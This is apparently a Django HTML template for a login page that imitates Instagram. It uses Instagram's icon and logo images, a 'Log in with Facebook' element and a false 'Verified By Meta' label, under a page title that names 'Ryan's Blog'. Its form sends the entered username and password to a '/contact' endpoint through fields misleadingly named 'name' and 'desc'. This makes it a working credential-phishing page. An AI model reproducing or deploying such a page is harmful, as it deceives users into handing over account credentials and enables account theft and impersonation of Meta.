<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- title -->
    <title>Ryan's Blog | LOGIN</title>

    <!-- custom css link -->
    {% comment %} <link rel="stylesheet" href="static\style.css"> {% endcomment %}

    <!-- favicon -->
    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" type="image/x-icon">

    <!-- boxicons cdn link -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    {% comment %} <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css"> {% endcomment %}
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: sans-serif;
        }
        
        body {
            display: flex;
            justify-content: center;
            height: 100vh;
            align-items: center;
            gap: 40px;
        }
        
        .insta__form {
            display: flex;
            flex-direction: column;
            gap: 40px;
        }
        
        .login__form {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 40px;
        }
        
        .form {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        input {
            max-width: 400px;
            width: 300px;
            background-color: #ECF3FF;
            border: 0;
            padding: 10px 20px;
            border: 1px solid #eee;
            border-radius: 50px;
            outline: none;
            color: #666;
        }
        
        button {
            max-width: 400px;
            width: 300px;
            background-color: #3578E5;
            border: 0;
            padding: 10px 20px;
            border: 1px solid #eee;
            border-radius: 50px;
            outline: none;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
        }
        
        .or {
            font-size: 14px;
            font-weight: 600;
            color: #666;
            text-align: center;
            margin-top: 20px;
            position: relative;
        }
        
        .or::before {
            content: '';
            position: absolute;
            background-color: #666;
            height: 1px;
            bottom: 7px;
            left: 20px;
            width: 100px;
        }
        
        .or::after {
            content: '';
            position: absolute;
            background-color: #666;
            height: 1px;
            bottom: 7px;
            right: 20px;
            width: 100px;
        }
        
        h3 {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #385185;
            cursor: pointer;
        }
        
        h3 i {
            font-size: 22px;
        }
        
        .forget{
            margin-top: -20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 12px;
            color: #385185;
            cursor: pointer;
        }
        
        
        
        
        @media (max-width:764px) {
            .image__login{
                display: none;
            }
        }

        
    </style>
</head>


<body>
    
    
    

    <div class="image__login">
        <img src="https://i.ibb.co/zS7Kfzh/instagramimg.png" alt="">
    </div>

    <div class="insta__form">

        <div class="login__form">
            <img src="https://i.ibb.co/tcgZWww/instalogo.png">

            <form class="form" method="post" action="/contact">
              {% csrf_token %}

                <input type="text" placeholder="Phone number, username, or email" id="name" name="name">
                <input type="password" placeholder="Password" id="desc" name="desc">

                <button>
                    Log in
                </button>
                
                <span class="or">OR</span>
                
            </form>

            <h3>
                <i class='bx bxl-facebook-circle' ></i>
                Log in with Facebook
            </h3>

            <span class="forget">
                Verified By Meta
            </span>


        </div>



    </div>

</body>

</html>
